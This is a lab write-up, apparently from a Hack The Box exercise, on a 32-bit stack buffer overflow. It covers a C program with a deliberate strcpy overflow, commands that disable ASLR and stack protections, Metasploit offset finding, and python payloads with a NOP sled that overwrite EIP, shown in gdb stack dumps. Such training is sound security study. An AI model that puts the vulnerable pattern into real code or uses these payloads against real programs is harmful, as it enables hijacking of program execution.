# Goal
Taking over EIP to hijack the control of the program

# Create The Challenge
## C Code
```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```

## Disable ASLR
```bash
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space
```

## Compilation
```bash
student@nix-bow:~$ sudo apt install gcc-multilib
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"
```

## Creating Pattern using Metasploit
```bash
msf-pattern_create -l 1200
```

![alt text](image-2.png)
## GDB
```bash
$ calypse@fsociety [~/Downloads/htb-pwn-practice]: gdb -q .bow32
```

## Run The Pattern
```bash
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9
```

![alt text](image-3.png)

## Find Out The Offset Value Using Metasploit
```bash
$ calypse@fsociety [/opt]: msf-pattern_offset -q i5Bi
[*] Exact match at offset 1036

```

## Overwrite EIP with Our Desired Value
First, kill the previous process
```bash
(gef) kill
```

```bash
run $(python -c "print('0'*1036+'A'*4)")
```

![alt text](image-4.png)

If we have trouble seeing EIP, run:
```bash
(gef) info registers eip
```

Congratulations, we have successfully taken over the control of EIP!


# Import Point to Consider
Since Python3, python encodes string to `UTF-8` format, which can mess up the payload during our buffer overflow testing. So there is an alternative to using `print()` and default python string:

```python
run $(python -c 'import sys; sys.stdout.buffer.write(b"\x55" * (1040 - 100 - 200 - 4) + b"\x90" * 100 + b"\x44" * 200 + b"\x66" * 4)')
```

## Break Down

| Buffer | NOP Slade | Payload | Return Address
| -- | -- | -- | -- |
| \x55 | \x90 | \x44 | \x66 |
| 736 | 100 | 200 | 4


# Example From HTB
```bash
gef➤  run $(python -c 'import sys; sys.stdout.buffer.write(b"\x55" * (1040 - 100 - 150 - 4) + b"\x90" * 100 + b"\x44" * 150 + b"\x66" * 4)')
```

## Output
```bash
$eip   : 0x66666666 ("ffff"?)
```

## Program Crash
```bash
[#0] Id 1, Name: "bow32", stopped 0x66666666 in ?? (), reason: SIGSEGV
```

## Insight
The payload works fine since the return address reflects the last 4 bytes we have sent (`b"\x66"*4`)

## Stack Layout

```C
gef➤  x/250xw $esp-1000 (Basically Start Reading from the address 1000 bytes higher than $esp)
	   | Examine Stack / 250 words(a unit made of 4 bytes) in hex format

			| Buffer Starts Here
0xffffc668:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc678:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc688:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc698:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6a8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6b8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6c8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6d8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6e8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc6f8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc708:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc718:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc728:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc738:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc748:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc758:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc768:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc778:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc788:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc798:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7a8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7b8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7c8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7d8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7e8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc7f8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc808:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc818:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc828:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc838:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc848:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc858:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc868:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc878:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc888:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc898:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8a8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8b8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8c8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8d8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8e8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc8f8:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc908:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc918:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc928:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc938:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffc948:	0x55555555	0x55555555	0x90905555	0x90909090
										  | 0x55 Buffer Run Ends here (Right to Left(Little Endian) Reading might be a little weird)

0xffffc958:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc968:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc978:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc988:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc998:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc9a8:	0x90909090	0x90909090	0x90909090	0x44449090
													  | NOP (0x90) Slade Ends Here
0xffffc9b8:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffc9c8:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffc9d8:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffc9e8:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffc9f8:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffca08:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffca18:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffca28:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffca38:	0x44444444	0x44444444	0x44444444	0x44444444
0xffffca48:	0x44444444	[[0x66666666]] <--- This is the Return Address
					  | 0x44 (Payload Ends Here)
```

## Visualization with A Picture
![alt text](image-5.png)




